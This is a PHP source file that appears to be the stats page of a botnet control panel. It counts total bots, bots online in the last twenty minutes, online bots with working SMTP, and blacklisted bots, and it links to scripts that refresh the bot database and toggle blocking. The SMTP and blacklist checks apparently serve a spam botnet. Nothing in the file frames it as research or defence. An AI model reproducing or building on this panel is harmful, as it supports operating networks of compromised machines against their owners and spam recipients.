<?
  require("passwd.inc");
?>

<html>
<head>
<title>Hernya!!!</title>
<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251">
<style>

A:link {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:unactive {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:visited {color: #0049AA; font-size: 13px; text-decoration: underline; font-weight: bold;}
A:hover {color: #0049AA; font-size: 13px; text-decoration: none; font-weight: bold;}

.t1 {
  border-collapse: collapse;
}

.t1 td {
  padding: 2px 3px;
  border: solid 1px #666;
}

.t1 th {
  padding: 2px 3px;
  border: solid 1px #666;
  background: #ccc;
}


</style>
</head>
<body>

<?

  require("../cfg.php");
  $date_u = date("U");
  $need_date_u = $date_u - 20*60;
  
  $count_all=mysql_num_rows(mysql_query("SELECT id FROM robo;"));
  $count_online=mysql_num_rows(mysql_query("SELECT id FROM robo WHERE (`time` > $need_date_u);"));
  $count_goodline=mysql_num_rows(mysql_query("SELECT id FROM robo WHERE (`time` > $need_date_u) AND (`smtp` = 'ok');"));
  $count_block=mysql_num_rows(mysql_query("SELECT id FROM robo WHERE `bl` = '1';"));
  
  echo "<hr>\r\n";
  echo "<div align='center'><h2>Stats</h2></div>\r\n";
  include("menu.inc");
  echo "<hr>\r\n";
  
  
?>
<table align='CENTER'>
<tr><td>All Bots</td><td><? echo "$count_all"; ?></td></tr>
<tr><td>All Online</td><td><? echo "$count_online"; ?></td></tr>
<tr><td>Good Online</td><td><? echo "$count_goodline"; ?></td></tr>
<tr><td>Blocked</td><td><? echo "$count_block"; ?></td></tr>


<tr><td><A href='../del.php'>Refresh Bots Database</A></td></tr>
<tr><td><A href='../d_block.php'>Refresh Blocked</A></td></tr>

<?
    
    
    $fs = @fopen("../block.dat", "rb");
    if ($fs)
    {      
      $bl_fg = fread($fs, 1);
      fclose($fs);
    }
    else $bl_fg = 0;
    
    
    if ($bl_fg == '1')    
       echo "<tr><td><font color=#ff ><A href='../bl_on.php'>Blocked ON</A></font></td></tr>";    
    else
       echo "<tr><td><font color=#ff ><A href='../bl_on.php'>Blocked OFF</A></font></td></tr>";    
?>

</table>
</body>
</html>